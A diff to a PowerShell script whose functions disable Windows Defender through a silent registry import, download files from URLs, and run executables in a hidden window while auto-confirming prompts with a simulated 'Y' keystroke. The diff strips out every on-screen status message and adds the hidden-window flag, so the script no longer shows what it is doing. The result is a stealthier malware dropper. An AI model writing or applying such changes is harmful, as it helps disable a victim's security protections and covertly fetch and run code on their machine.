@@ -1,6 +1,5 @@
 # Function to disable Windows Defender
 function Disable-WindowsDefender {
-    Write-Host "Running Windows Defender..."
     $regContent = @"
 Windows Registry Editor Version 5.00
 
@@ -18,9 +17,7 @@ Windows Registry Editor Version 5.00
     $regContent | Out-File -FilePath $regFilePath -Encoding ASCII
     try {
         Start-Process regedit.exe -ArgumentList "/s $regFilePath" -Wait -ErrorAction Stop
-        Write-Host "Windows Defender Disabled"
     } catch {
-        Write-Host "Failed to disable Windows Defender: $_"
         Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to disable Windows Defender: $_" -ErrorAction SilentlyContinue
     }
 }
@@ -33,11 +30,8 @@ function Download-File {
     )
 
     try {
-        Write-Host "Downloading: $url to $outputPath"
         Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
-        Write-Host "Downloaded: $url to $outputPath"
     } catch {
-        Write-Host "Failed to download: $url"
         Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to download: $url" -ErrorAction SilentlyContinue
     }
 }
@@ -49,15 +43,12 @@ function Run-Executable {
     )
 
     try {
-        Write-Host "Executing: $filePath"
-        $process = Start-Process -FilePath $filePath -NoNewWindow -PassThru
+        $process = Start-Process -FilePath $filePath -NoNewWindow -PassThru -WindowStyle Hidden
         $process.WaitForInputIdle()
         Add-Type -AssemblyName System.Windows.Forms
         [System.Windows.Forms.SendKeys]::SendWait("Y")
         $process.WaitForExit()
-        Write-Host "Executed: $filePath"
     } catch {
-        Write-Host "Failed to execute: $filePath"
         Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to execute: $filePath" -ErrorAction SilentlyContinue
     }
 }
